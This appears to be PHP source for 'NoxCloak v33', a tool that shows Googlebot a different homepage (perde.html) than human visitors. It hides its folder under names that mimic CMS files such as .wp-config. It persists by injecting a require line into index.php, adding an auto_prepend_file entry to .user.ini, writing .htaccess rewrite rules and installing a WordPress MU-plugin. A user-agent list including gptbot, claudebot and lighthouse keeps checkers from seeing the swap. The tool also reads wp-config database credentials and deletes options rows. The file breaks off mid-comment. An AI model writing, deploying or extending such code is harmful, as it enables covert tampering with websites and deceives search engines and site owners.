<?php
/**
 * NoxCloak v33 — Universal SEO Cloaking Engine (Self-Healing)
 * Googlebot → perde.html | Kullanıcı → gerçek site
 * CMS'e göre otomatik klasör (.nox-{cms}), motor (nox-{cms}.php), panel kapısı.
 */
error_reporting(E_ALL);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '512M');
@set_time_limit(90);

if (!ob_get_level()) { ob_start(); }

register_shutdown_function(function () {
    $e = error_get_last();
    if ($e && in_array($e['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR], true)) {
        while (ob_get_level() > 0) ob_end_clean();
        if (!headers_sent()) { header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found', true, 404); }
        exit;
    }
});

@ini_set('session.use_cookies', 0);
@ini_set('session.use_only_cookies', 0);
if (!headers_sent()) {
    @header('Set-Cookie: PHPSESSID=deleted; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/');
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        if (!is_string($a) || !is_string($b) || strlen($a) !== strlen($b)) return false;
        $r = 0;
        for ($i = 0, $l = strlen($a); $i < $l; $i++) $r |= ord($a[$i]) ^ ord($b[$i]);
        return $r === 0;
    }
}

if (!function_exists('nc_safe_rand_bytes')) {
    function nc_safe_rand_bytes($length) {
        if (function_exists('random_bytes')) {
            try { return random_bytes($length); } catch (Exception $e) {}
        }
        if (function_exists('openssl_random_pseudo_bytes')) {
            $b = openssl_random_pseudo_bytes($length);
            if ($b !== false) return $b;
        }
        $s = '';
        for ($i = 0; $i < $length; $i++) { $s .= chr(mt_rand(0, 255)); }
        return $s;
    }
}

/* Meta dosyası: dosya adına özgü hash → farklı isimde aynı dizine yüklenince bağımsız token */
$meta_file   = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.nox_' . substr(md5(basename(__FILE__)), 0, 10) . '.meta';
$stored_hash = file_exists($meta_file) ? trim((string)@file_get_contents($meta_file)) : '';

/* ==================== TEMEL FONKSİYONLAR ==================== */

function nc_get_client_ip() {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

/**
 * nc_detect_cms_single — tek bir dizini kontrol eder.
 */
function nc_detect_cms_single($d) {
    $d = rtrim($d, '/\\');
    if (file_exists($d.'/wp-config.php') || file_exists($d.'/wp-blog-header.php'))
        return 'wordpress';
    if (file_exists($d.'/configuration.php') && (is_dir($d.'/components') || is_dir($d.'/libraries/joomla')))
        return 'joomla';
    if (file_exists($d.'/core/lib/Drupal.php') || file_exists($d.'/sites/default/settings.php'))
        return 'drupal';
    if (file_exists($d.'/artisan') && file_exists($d.'/composer.json'))
        return 'laravel';
    if (file_exists($d.'/config/settings.inc.php') || file_exists($d.'/classes/PrestaShopAutoload.php'))
        return 'prestashop';
    if (file_exists($d.'/app/Mage.php') || file_exists($d.'/bin/magento'))
        return 'magento';
    if (file_exists($d.'/config.php') && file_exists($d.'/system/startup.php'))
        return 'opencart';
    if (file_exists($d.'/includes/functions.php') && file_exists($d.'/lang/english.php') && is_dir($d.'/templates/default'))
        return 'whmcs';
    if (file_exists($d.'/symfony.lock') || (file_exists($d.'/bin/console') && file_exists($d.'/composer.json')))
        return 'symfony';
    if (file_exists($d.'/system/core/CodeIgniter.php') || is_dir($d.'/application/controllers'))
        return 'codeigniter';
    if (file_exists($d.'/configuration.php'))
        return 'joomla';
    /* Laravel/Symfony: doc root public/ — üst dizini kontrol et */
    if (is_dir($d.'/../artisan') || (file_exists(dirname($d).'/artisan') && file_exists(dirname($d).'/composer.json')))
        return 'laravel';
    if (file_exists(dirname($d).'/bin/console') && file_exists(dirname($d).'/composer.json'))
        return 'symfony';
    /* Magento: doc root pub/ */
    if (file_exists(dirname($d).'/bin/magento'))
        return 'magento';
    return '';
}

/**
 * nc_detect_cms — DOCUMENT_ROOT + dosyanın bulunduğu dizinden yukarı doğru 5 seviye tarar.
 * Böylece subdirectory'e yüklenmiş veya DOCUMENT_ROOT yanlış ayarlı sitelerde de doğru CMS bulunur.
 */
function nc_detect_cms($dir) {
    // Önce verilen dizini dene
    $candidates = [rtrim($dir, '/\\')];

    // Dosyanın bulunduğu dizinden yukarı doğru 5 seviye ekle
    $walk = rtrim(dirname(__FILE__), '/\\');
    for ($i = 0; $i < 5; $i++) {
        $candidates[] = $walk;
        $parent = dirname($walk);
        if ($parent === $walk) break; // kök dizine ulaştık
        $walk = $parent;
    }

    // DOCUMENT_ROOT'u da ekle (zaten $dir ile aynı olabilir, array_unique halletsin)
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $candidates[] = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
    }

    $candidates = array_unique($candidates);

    foreach ($candidates as $c) {
        if (!is_dir($c)) continue;
        $found = nc_detect_cms_single($c);
        if ($found !== '') return $found;
    }
    return 'php'; // hiçbiri eşleşmedi → generic PHP
}

function nc_cms_badge($cms) {
    $map = [
        'wordpress'   => ['WordPress',   '#21759b', '#fff'],
        'joomla'      => ['Joomla',       '#F44321', '#fff'],
        'drupal'      => ['Drupal',       '#0678BE', '#fff'],
        'laravel'     => ['Laravel',      '#FF2D20', '#fff'],
        'prestashop'  => ['PrestaShop',   '#DF0067', '#fff'],
        'magento'     => ['Magento',      '#F46F25', '#fff'],
        'opencart'    => ['OpenCart',     '#1CACDE', '#fff'],
        'whmcs'       => ['WHMCS',        '#1E4D8C', '#fff'],
        'symfony'     => ['Symfony',      '#6c7079', '#fff'],
        'codeigniter' => ['CodeIgniter',  '#EF4223', '#fff'],
        'php'         => ['PHP',          '#777BB4', '#fff'],
    ];
    $info = isset($map[$cms]) ? $map[$cms] : ['PHP', '#777BB4', '#fff'];
    return '<span style="background:' . $info[1] . ';color:' . $info[2]
         . ';font-size:10px;font-weight:bold;padding:2px 8px;border-radius:3px;letter-spacing:.5px;">'
         . htmlspecialchars($info[0], ENT_QUOTES, 'UTF-8') . '</span>';
}

/**
 * nc_cms_dir_slug — CMS'e özgü, sistem dosya adından türetilmiş gizli klasör slug'ı.
 * .nox- prefix'i yok; her CMS'in kendi ayırt edici dosyasının adını kullanır.
 * WordPress → .wp-config | Joomla → .configuration | Laravel → .artisan | vs.
 * Bilinmeyen PHP → dizindeki gerçek bir PHP dosyasının adı.
 */
function nc_cms_dir_slug($docroot, $cms) {
    switch ($cms) {
        case 'wordpress':   return 'wp-config';     // wp-config.php
        case 'joomla':      return 'configuration'; // configuration.php
        case 'drupal':      return 'settings';       // sites/default/settings.php
        case 'laravel':     return 'artisan';        // artisan
        case 'symfony':     return 'symfony';        // symfony.lock
        case 'prestashop':  return 'config';         // config/settings.inc.php
        case 'magento':     return 'store';          // bin/magento
        case 'opencart':    return 'system';         // system/startup.php
        case 'codeigniter': return 'application';    // application/controllers
        case 'whmcs':       return 'includes';       // includes/functions.php
        default:
            /* Bilinmeyen CMS: dizindeki gerçek bir PHP dosyasının adını al */
            $d = rtrim($docroot, '/\\');
            foreach (['config','functions','settings','bootstrap','init','app','core','main','setup'] as $n) {
                if (file_exists($d . '/' . $n . '.php')) return $n;
            }
            $files = @glob($d . '/*.php') ?: [];
            foreach ($files as $f) {
                $name = strtolower(pathinfo($f, PATHINFO_FILENAME));
                if ($name !== 'index' && preg_match('/^[a-z][a-z0-9_-]{2,20}$/', $name)) return $name;
            }
            return 'index'; // index.php her zaman vardır
    }
}

function nc_content_dir($docroot) {
    static $cache = [];
    $key = rtrim($docroot, '/\\');
    if (isset($cache[$key])) return $cache[$key];
    $cms  = nc_detect_cms($docroot);
    $slug = nc_cms_dir_slug($key, $cms);
    $d    = $key . DIRECTORY_SEPARATOR . '.' . $slug;
    if (!is_dir($d)) {
        /* Geriye uyumluluk: .nox-cloak ve .nox-{cms} adlarından taşı */
        $old_nox_slug = preg_replace('/[^a-z0-9]/', '', strtolower($cms ?: 'php'));
        $legacy_cms   = $key . DIRECTORY_SEPARATOR . '.nox-' . $old_nox_slug;
        $legacy_cloak = $key . DIRECTORY_SEPARATOR . '.nox-cloak';
        if (is_dir($legacy_cms))   { @rename($legacy_cms,   $d); }
        elseif (is_dir($legacy_cloak)) { @rename($legacy_cloak, $d); }
        else { @mkdir($d, 0755, true); }
    }
    $cache[$key] = $d;
    return $d;
}

function nc_write_log($action_name, $details = '') {
    global $DIR;
    $log_file   = nc_content_dir($DIR) . '/audit.log';
    $ip         = nc_get_client_ip();
    $time       = date('Y-m-d H:i:s');
    $owner_file = nc_content_dir($DIR) . '/.owner_ip';
    $owner_ip   = file_exists($owner_file) ? trim((string)file_get_contents($owner_file)) : $ip;
    $type       = ($ip === $owner_ip) ? 'owner' : 'visitor';
    /* IP loglanmıyor — sadece rol (owner/visitor) kaydedilir */
    $entry      = json_encode(
        ['time' => $time, 'type' => $type, 'action' => $action_name, 'details' => $details],
        JSON_UNESCAPED_UNICODE
    ) . "\n";
    @file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
}

function nc_recursive_rmdir($dir) {
    if (!is_dir($dir)) return 0;
    $count = 0;
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($it as $file) {
            if ($file->isFile() || $file->isLink()) { @unlink($file->getRealPath()); $count++; }
            elseif ($file->isDir())                 { @rmdir($file->getRealPath()); }
        }
    } catch (Exception $e) {}
    return $count;
}

/* ==================== CMS-AWARE CACHE & INJECTION ==================== */

/**
 * nc_get_cloak_php — auto_prepend_file olarak tüm CMS'lerde çalışan evrensel cloak motoru.
 * Yalnızca Google botunu perde.html'ye yönlendirir; normal kullanıcıya dokunmaz.
 */
function nc_get_cloak_php($DIR) {
    $rcDir      = nc_content_dir($DIR);
    $lock_path  = addslashes($rcDir . '/cloak.lock');
    $perde_path = addslashes($rcDir . '/perde.html');
    return "<?php\n"
        . "/* NoxCloak v33 — auto_prepend cloak motor */\n"
        . "\$_nc_lock='" . $lock_path . "';\$_nc_perde='" . $perde_path . "';\n"
        . "if(file_exists(\$_nc_lock)&&file_exists(\$_nc_perde)){\n"
        . "  \$ua=isset(\$_SERVER['HTTP_USER_AGENT'])?strtolower(\$_SERVER['HTTP_USER_AGENT']):'';\n"
        . "  \$uri=isset(\$_SERVER['REQUEST_URI'])?strtok(\$_SERVER['REQUEST_URI'],'?'):'/';\n"
        /* Sahte Googlebot tespiti — bu UA'lar Googlebot iddiasında bulunsa bile perde verilmez */
        . "  \$_ndc=array('curl','wget','python','go-http','java','scrapy','axios','phantom',\n"
        . "    'selenium','puppeteer','playwright','headlesschrome','chromium','bingbot',\n"
        . "    'yandex','duckduckbot','baiduspider','ahrefsbot','semrushbot','mj12bot',\n"
        . "    'dotbot','ccbot','rogerbot','exabot','sistrix','majestic','facebookexternalhit',\n"
        . "    'twitterbot','linkedinbot','pinterest','lighthouse','pagespeed','gtmetrix',\n"
        . "    'pingdom','screaming frog','uptimerobot','newrelic','chatgpt','claudebot',\n"
        . "    'amazonbot','applebot','gptbot','bytespider','perplexitybot','petalbot',\n"
        . "    'dataforseo','magebot','dotbot','seznambot','sezbot');\n"
        . "  \$_nfake=false;foreach(\$_ndc as \$_nkw){if(strpos(\$ua,\$_nkw)!==false){\$_nfake=true;break;}}\n"
        . "  \$bot=!\$_nfake&&(strpos(\$ua,'googlebot')!==false||strpos(\$ua,'adsbot')!==false\n"
        . "     ||strpos(\$ua,'mediapartners')!==false||strpos(\$ua,'inspectiontool')!==false\n"
        . "     ||strpos(\$ua,'googleother')!==false||strpos(\$ua,'google-extended')!==false\n"
        . "     ||strpos(\$ua,'storebot-google')!==false||strpos(\$ua,'google-cloudvertexbot')!==false);\n"
        . "  \$bypass=strpos(\$ua,'noxcloak-test')!==false;\n"
        . "  if(\$bot&&!\$bypass&&(\$uri==='/'||\$uri==='/index.php')){\n"
        . "    defined('DONOTCACHEPAGE')||define('DONOTCACHEPAGE',true);\n"
        . "    defined('DONOTCACHEOBJECT')||define('DONOTCACHEOBJECT',true);\n"
        . "    defined('DONOTCACHEDB')||define('DONOTCACHEDB',true);\n"
        . "    defined('DONOTCACHELITESPEED')||define('DONOTCACHELITESPEED',true);\n"
        . "    while(ob_get_level()>0)ob_end_clean();\n"
        . "    if(!headers_sent()){\n"
        . "      header('Content-Type: text/html; charset=utf-8');\n"
        . "      header('Cache-Control: no-store,no-cache,must-revalidate,max-age=0');\n"
        . "      header('Pragma: no-cache');\n"
        . "      header('X-LiteSpeed-Cache-Control: no-cache');\n"
        . "      header('CF-Cache-Status: BYPASS');\n"
        . "      header('Surrogate-Control: no-store');\n"
        . "      header('Vary: User-Agent');\n"
        . "      header('X-NoxCloak-Served: 1');\n"
        . "    }\n"
        . "    readfile(\$_nc_perde);exit;\n"
        . "  }\n"
        . "}\n";
}

/**
 * nc_get_htaccess_rule — Yalnızca Apache RewriteRule yazar; php_value içermez.
 * auto_prepend_file .user.ini üzerinden yönetilir (FPM/CGI/LiteSpeed uyumlu, 500 riski yok).
 * perde.html veya cloak.lock yoksa kural devreye girmez (404 koruması).
 */
function nc_get_htaccess_rule($DIR) {
    $cms       = nc_detect_cms($DIR);
    $cloak_php = nc_cloak_engine_path($DIR, $cms);
    $nox_dir   = basename(nc_content_dir($DIR)); // e.g. .nox-wordpress
    return "\n# BEGIN NOX-CLOAK-RULE\n"
        . "<IfModule mod_rewrite.c>\n"
        . "RewriteEngine On\n"
        . "RewriteBase /\n"
        . "RewriteCond %{HTTP_USER_AGENT} (googlebot|adsbot|mediapartners|inspectiontool|googleother|google-extended|storebot-google|google-cloudvertexbot) [NC]\n"
        . "RewriteCond %{REQUEST_URI} ^/?(index\\.php)?$ [NC]\n"
        . "RewriteCond %{DOCUMENT_ROOT}/{$nox_dir}/cloak.lock -f\n"
        . "RewriteCond %{DOCUMENT_ROOT}/{$nox_dir}/perde.html -f\n"
        . "RewriteRule ^ {$nox_dir}/perde.html [L]\n"
        . "</IfModule>\n"
        . "# END NOX-CLOAK-RULE\n";
}

/**
 * nc_cloak_engine_path — CMS'e özgü motor dosyasının tam yolunu döndürür.
 * ör: .nox-wordpress/nox-wordpress.php, .nox-laravel/nox-laravel.php, vs.
 */
function nc_cloak_engine_path($DIR, $cms = null) {
    if ($cms === null) $cms = nc_detect_cms($DIR);
    $slug = preg_replace('/[^a-z0-9]/', '', strtolower($cms ?: 'php'));
    if ($slug === '') $slug = 'php';
    return nc_content_dir($DIR) . '/nox-' . $slug . '.php';
}

/**
 * nc_cms_app_root — Laravel/Symfony/Magento'da doc root public/ veya pub/ ise gerçek uygulama kökünü döndürür.
 */
function nc_cms_app_root($DIR, $cms) {
    if ($cms === 'laravel' || $cms === 'symfony') {
        if (!file_exists($DIR . '/artisan') && !file_exists($DIR . '/bin/console')) {
            $parent = dirname($DIR);
            if (file_exists($parent . '/artisan') || file_exists($parent . '/bin/console')) return $parent;
        }
    }
    if ($cms === 'magento') {
        if (!file_exists($DIR . '/bin/magento')) {
            $parent = dirname($DIR);
            if (file_exists($parent . '/bin/magento')) return $parent;
        }
    }
    return $DIR;
}

/**
 * nc_wp_purge_root_cache — WordPress: tüm bilinen cache plugin'lerinin kök URL statik dosyasını siler.
 * WP Super Cache, WP Fastest Cache, W3TC, Cache Enabler, WP Rocket, Breeze,
 * Hummingbird, Comet Cache, FlyingPress, LiteSpeed, NitroPack (CDN uyarısı).
 */
function nc_wp_purge_root_cache($DIR) {
    $host    = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    $wcDir   = $DIR . '/wp-content/cache';
    $deleted = 0;
    /* Her plugin için kök URL cache dosyalarını sil */
    $patterns = [
        /* WP Super Cache */
        $wcDir . '/supercache/' . $host . '/index.html',
        $wcDir . '/supercache/' . $host . '/index.html.gz',
        /* WP Fastest Cache */
        $wcDir . '/all/index.html',
        $wcDir . '/all/index.html.gz',
        /* W3 Total Cache - page cache */
        $wcDir . '/page/0/http/' . $host . '/_index.html',
        $wcDir . '/page/0/https/' . $host . '/_index.html',
        $wcDir . '/page/0/http/' . $host . '/',
        $wcDir . '/page/0/https/' . $host . '/',
        /* Cache Enabler */
        $wcDir . '/cache-enabler/' . $host . '/index.html',
        $wcDir . '/cache-enabler/' . $host . '/index.https.html',
        /* WP Rocket */
        $wcDir . '/wp-rocket/' . $host . '/index.html',
        $wcDir . '/wp-rocket/' . $host . '/index.html_gzip',
        /* Breeze (Cloudways) */
        $wcDir . '/breeze/1/' . $host . '/index.html',
        /* Comet Cache */
        $wcDir . '/comet-cache/cache/http/' . $host . '/index.html',
        $wcDir . '/comet-cache/cache/https/' . $host . '/index.html',
        /* FlyingPress */
        $wcDir . '/flying-press/' . $host . '/index.html',
        $wcDir . '/flying-press/' . $host . '/index.html.br',
        /* Hummingbird */
        $DIR . '/wp-content/wphb-cache/page-caching/' . md5('/') . '.html',
        /* LiteSpeed Cache — html ve gzip */
        $DIR . '/wp-content/litespeed/1/index.html',
        $DIR . '/wp-content/litespeed/1/index.html.gz',
    ];
    foreach ($patterns as $f) {
        if (is_file($f) && @unlink($f)) $deleted++;
    }
    /* W3TC sayfa cache dizini varsa içeriğini temizle */
    foreach ([$wcDir.'/page/0/http/'.$host, $wcDir.'/page/0/https/'.$host] as $w3d) {
        if (is_dir($w3d)) $deleted += nc_recursive_rmdir($w3d);
    }
    /* Hummingbird page-caching dizini */
    $hbDir = $DIR . '/wp-content/wphb-cache/page-caching';
    if (is_dir($hbDir)) $deleted += nc_recursive_rmdir($hbDir);
    /* NitroPack / Cloudflare APO — CDN katmanı, PHP'den silinemez */
    /* Bu pluginler için CDN üzerinden purge gerekir; nc_full_diagnosis uyarı verir. */
    return $deleted;
}

/**
 * nc_purge_all_caches — Her CMS için kendi cache dizinlerini temizler.
 */
function nc_purge_all_caches($DIR) {
    if (function_exists('opcache_reset')) @opcache_reset();
    @clearstatcache(true);

    $cms     = nc_detect_cms($DIR);
    $appRoot = nc_cms_app_root($DIR, $cms);
    $dirs    = [];

    switch ($cms) {
        case 'wordpress':
            /* Önce kök URL statik dosyalarını hassas şekilde sil */
            nc_wp_purge_root_cache($DIR);
            $dirs = [
                /* Genel cache dizinleri */
                $DIR . '/wp-content/cache',
                /* LiteSpeed Cache */
                $DIR . '/wp-content/litespeed',
                /* W3 Total Cache */
                $DIR . '/wp-content/w3tc-cache',
                /* WP Rocket */
                $DIR . '/wp-content/wp-rocket-cache',
                /* WP Super Cache */
                $DIR . '/wp-content/cache/supercache',
                /* JS/CSS minify cache */
                $DIR . '/wp-content/cache/min',
                /* Object cache */
                $DIR . '/wp-content/cache/object',
                /* WP Optimize */
                $DIR . '/wp-content/cache/wpo-cache',
                /* Breeze */
                $DIR . '/wp-content/cache/breeze',
                /* Hummingbird */
                $DIR . '/wp-content/wphb-cache',
                /* Comet Cache */
                $DIR . '/wp-content/cache/comet-cache',
                /* FlyingPress */
                $DIR . '/wp-content/cache/flying-press',
                /* WP Fastest Cache */
                $DIR . '/wp-content/cache/all',
                /* Cache Enabler */
                $DIR . '/wp-content/cache/cache-enabler',
                /* NitroPack */
                $DIR . '/wp-content/nitropack',
            ];
            break;
        case 'joomla':
            $dirs = [
                $DIR . '/cache',
                $DIR . '/administrator/cache',
            ];
            break;
        case 'drupal':
            $dirs = [
                $DIR . '/sites/default/files/php',
                $DIR . '/sites/default/files/css',
                $DIR . '/sites/default/files/js',
                $DIR . '/sites/default/files/styles',
                $DIR . '/sites/default/files/config_cache',
            ];
            break;
        case 'laravel':
            $dirs = [
                $appRoot . '/bootstrap/cache',
                $appRoot . '/storage/framework/cache',
                $appRoot . '/storage/framework/views',
                $appRoot . '/storage/framework/sessions',
            ];
            break;
        case 'prestashop':
            $dirs = [
                $DIR . '/var/cache',
                $DIR . '/cache/smarty/compile',
                $DIR . '/cache/smarty/cache',
                $DIR . '/img/tmp',
            ];
            break;
        case 'magento':
            $dirs = [
                $appRoot . '/var/cache',
                $appRoot . '/var/page_cache',
                $appRoot . '/var/full_page_cache',
                $appRoot . '/var/generation',
                $appRoot . '/generated/code',
                $appRoot . '/generated/metadata',
            ];
            break;
        case 'opencart':
            $dirs = [
                $DIR . '/system/storage/cache',
                $DIR . '/system/cache',
            ];
            break;
        case 'whmcs':
            $dirs = [
                $DIR . '/templates_c',
                $DIR . '/storage/cache',
            ];
            break;
        case 'symfony':
            $dirs = [
                $appRoot . '/var/cache',
            ];
            break;
        case 'codeigniter':
            $dirs = [
                $DIR . '/application/cache',
                $DIR . '/system/cache',
                $DIR . '/writable/cache',
            ];
            break;
        default: // generic PHP
            $dirs = [
                $DIR . '/cache',
                $DIR . '/tmp',
                $DIR . '/temp',
                $DIR . '/var/cache',
            ];
            break;
    }

    $total = 0;
    foreach ($dirs as $d) {
        if (is_dir($d)) $total += nc_recursive_rmdir($d);
    }

    /* WordPress: WP transient SQL purge + LiteSpeed PURGE + Managed host */
    if ($cms === 'wordpress') {
        /* WP transient — doğrudan SQL */
        $_wc_cfg_path = function_exists('nc_find_wpconfig') ? nc_find_wpconfig($DIR) : '';
        if ($_wc_cfg_path) {
            $_wc_cfg = nc_parse_wpconfig($_wc_cfg_path);
            if (!empty($_wc_cfg['creds']['DB_NAME'])) {
                $_wc_db = nc_db_connect($_wc_cfg['creds']);
                if ($_wc_db) {
                    $_wpfx = $_wc_cfg['prefix'];
                    @$_wc_db->query("DELETE FROM `{$_wpfx}options` WHERE option_name LIKE '\\_transient\\_%' OR option_name LIKE '\\_site\\_transient\\_%'");
                    @$_wc_db->query("DELETE FROM `{$_wpfx}options` WHERE option_name='rewrite_rules'");
                    $_wc_db->close();
                }
            }
        }
        /* LiteSpeed sunucu seviyesi HTTP PURGE */
        $srv_sw = strtolower(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '');
        if ((strpos($srv_sw, 'litespeed') !== false || strpos($srv_sw, 'lsws') !== false)
                && function_exists('curl_init')) {
            $ls_scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $ls_ch = curl_init($ls_scheme . '://' . $_SERVER['HTTP_HOST'] . '/');
            curl_setopt_array($ls_ch, [
                CURLOPT_CUSTOMREQUEST  => 'PURGE',
                CURLOPT_HTTPHEADER     => ['X-LiteSpeed-Purge: *'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_NOBODY         => true,
                CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_TIMEOUT        => 5,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            curl_exec($ls_ch); curl_close($ls_ch);
        }
        /* Managed host */
        if (class_exists('WpeCommon')) {
            try { if (method_exists('WpeCommon','purge_varnish_cache')) @WpeCommon::purge_varnish_cache(); } catch(Exception $_e) {}
            try { if (method_exists('WpeCommon','purge_memcached'))     @WpeCommon::purge_memcached(); }     catch(Exception $_e) {}
        }
        if (class_exists('Kinsta\\Cache') && method_exists('Kinsta\\Cache','purge_complete_caches')) {
            try { $_ki = new Kinsta\Cache(); @$_ki->purge_complete_caches(); } catch(Exception $_e) {}
        }
        if (function_exists('pantheon_clear_edge_all')) {
            try { @pantheon_clear_edge_all(); } catch(Exception $_e) {}
        }
    }

    return $total;
}

function nc_get_mu_plugin_code($DIR) {
    $rcDir      = nc_content_dir($DIR);
    $lock_path  = addslashes($rcDir . '/cloak.lock');
    $perde_path = addslashes($rcDir . '/perde.html');
    return "<?php\n"
        . "/*\n"
        . "Plugin Name: NoxCloak Autonomous Engine v33\n"
        . "Description: Googlebot → perde.html (MU-Plugin katmanı — cache plugin'leri bypass eder)\n"
        . "*/\n"
        /* En erken mümkün noktada: plugins_loaded öncesi */
        . "defined('ABSPATH')||exit;\n"
        /* Anti-cache constants — WP Rocket, LiteSpeed, W3TC, WP Super Cache, vs. */
        . "defined('DONOTCACHEPAGE')||(define('DONOTCACHEPAGE',true));\n"
        . "defined('DONOTCACHEOBJECT')||(define('DONOTCACHEOBJECT',true));\n"
        . "defined('DONOTCACHEDB')||(define('DONOTCACHEDB',true));\n"
        . "defined('DONOTCACHELITESPEED')||(define('DONOTCACHELITESPEED',true));\n"
        . "defined('DONOTMINIFY')||(define('DONOTMINIFY',true));\n"
        . "\$_nc_lock  = '" . $lock_path  . "';\n"
        . "\$_nc_perde = '" . $perde_path . "';\n"
        . "if(file_exists(\$_nc_lock) && file_exists(\$_nc_perde)){\n"
        . "  \$ua  = isset(\$_SERVER['HTTP_USER_AGENT'])?strtolower(\$_SERVER['HTTP_USER_AGENT']):'';\n"
        . "  \$uri = isset(\$_SERVER['REQUEST_URI'])?strtok(\$_SERVER['REQUEST_URI'],'?'):'/';\n"
        /* Sahte Googlebot tespiti — MU-Plugin katmanında da aynı filtre */
        . "  \$_ndc=array('curl','wget','python','go-http','java','scrapy','axios','phantom',\n"
        . "    'selenium','puppeteer','playwright','headlesschrome','chromium','bingbot',\n"
        . "    'yandex','duckduckbot','baiduspider','ahrefsbot','semrushbot','mj12bot',\n"
        . "    'dotbot','ccbot','rogerbot','exabot','sistrix','majestic','facebookexternalhit',\n"
        . "    'twitterbot','linkedinbot','pinterest','lighthouse','pagespeed','gtmetrix',\n"
        . "    'pingdom','screaming frog','uptimerobot','newrelic','chatgpt','claudebot',\n"
        . "    'amazonbot','applebot','gptbot','bytespider','perplexitybot','petalbot',\n"
        . "    'dataforseo','magebot','dotbot','seznambot','sezbot');\n"
        . "  \$_nfake=false;foreach(\$_ndc as \$_nkw){if(strpos(\$ua,\$_nkw)!==false){\$_nfake=true;break;}}\n"
        . "  \$bot = !\$_nfake&&(strpos(\$ua,'googlebot')!==false||strpos(\$ua,'adsbot')!==false\n"
        . "       ||strpos(\$ua,'mediapartners')!==false||strpos(\$ua,'inspectiontool')!==false\n"
        . "       ||strpos(\$ua,'googleother')!==false||strpos(\$ua,'google-extended')!==false\n"
        . "       ||strpos(\$ua,'storebot-google')!==false||strpos(\$ua,'google-cloudvertexbot')!==false);\n"
        . "  \$bypass=strpos(\$ua,'noxcloak-test')!==false;\n"
        . "  if(\$bot&&!\$bypass&&(\$uri==='/'||\$uri==='/index.php')){\n"
        . "    while(ob_get_level()>0)ob_end_clean();\n"
        . "    if(!headers_sent()){\n"
        . "      header('Content-Type: text/html; charset=utf-8');\n"
        . "      header('Cache-Control: no-store,no-cache,must-revalidate,max-age=0');\n"
        . "      header('Pragma: no-cache');\n"
        . "      header('X-LiteSpeed-Cache-Control: no-cache');\n"
        . "      header('CF-Cache-Status: BYPASS');\n"
        . "      header('Surrogate-Control: no-store');\n"
        . "      header('Vary: User-Agent');\n"
        . "      header('X-NoxCloak-Served: 1');\n"
        . "    }\n"
        . "    readfile(\$_nc_perde);exit;\n"
        . "  }\n"
        . "}\n";
}

/**
 * nc_get_index_inject_code — index.php'ye enjekte edilecek require satırı.
 * .htaccess yazılamadığında veya yoksa son katman olarak index.php başına eklenir.
 */
function nc_get_index_inject_code($DIR) {
    $engine = nc_cloak_engine_path($DIR);
    $engine = addslashes($engine);
    return "<?php if(file_exists('" . $engine . "'))require_once('" . $engine . "');?>";
}

/**
 * nc_inject_index_php — index.php'nin en başına NoxCloak require satırı ekler.
 * Zaten ekliyse dokunmaz. İzin yoksa false döner.
 * @return bool|string  true=eklendi, 'exists'=zaten var, false=hata
 */
function nc_inject_index_php($DIR) {
    $index = $DIR . '/index.php';
    if (!file_exists($index) || !is_writable($index)) return false;
    $content = (string)@file_get_contents($index);
    /* Zaten enjekte edilmişse dokunma */
    if (strpos($content, 'NoxCloak') !== false || strpos($content, nc_content_dir($DIR)) !== false) {
        return 'exists';
    }
    $inject  = nc_get_index_inject_code($DIR) . "\n";
    /* PHP açılış tagı varsa ondan sonra ekle, yoksa başa */
    if (strpos($content, '<?php') === 0) {
        $new = substr_replace($content, "<?php\n" . $inject . ltrim(substr($content, 5)), 0, strlen($content));
    } else {
        $new = $inject . $content;
    }
    return (@file_put_contents($index, $new) !== false);
}

/**
 * nc_remove_index_inject — index.php'den NoxCloak satırını temizler (uninstall).
 */
function nc_remove_index_inject($DIR) {
    $index = $DIR . '/index.php';
    if (!file_exists($index)) return;
    $content = (string)@file_get_contents($index);
    $clean = preg_replace('/\s*<\?php\s+if\(file_exists\([^\)]+\)\)require_once[^\?]+\?>\s*\n?/', '', $content);
    if ($clean !== $content) @file_put_contents($index, $clean);
}

/* ==================== PHP-FPM / .user.ini KATMANI ==================== */

/**
 * nc_get_sapi — PHP SAPI adını döndürür.
 * fpm-fcgi → PHP-FPM | cgi-fcgi → CGI | apache2handler → mod_php | litespeed → LiteSpeed
 */
function nc_get_sapi() {
    return strtolower((string)php_sapi_name());
}

/**
 * nc_is_fpm — .htaccess php_value direktifinin çalışMADığı bir SAPI mı?
 * PHP-FPM, CGI ve bazı LiteSpeed kurulumlarında php_value .htaccess'te sessizce görmezden gelinir.
 * Bu durumlarda auto_prepend_file için .user.ini zorunludur.
 */
function nc_is_fpm() {
    $s = nc_get_sapi();
    return strpos($s, 'fpm') !== false
        || strpos($s, 'cgi') !== false
        || $s === 'litespeed';
}

/**
 * nc_get_user_ini — .user.ini içeriği.
 * PHP-FPM/CGI/LiteSpeed için auto_prepend_file direktifi.
 */
function nc_get_user_ini($DIR) {
    $engine = addslashes(nc_cloak_engine_path($DIR));
    return "; BEGIN NOX-CLOAK\nauto_prepend_file = \"{$engine}\"\n; END NOX-CLOAK\n";
}

/**
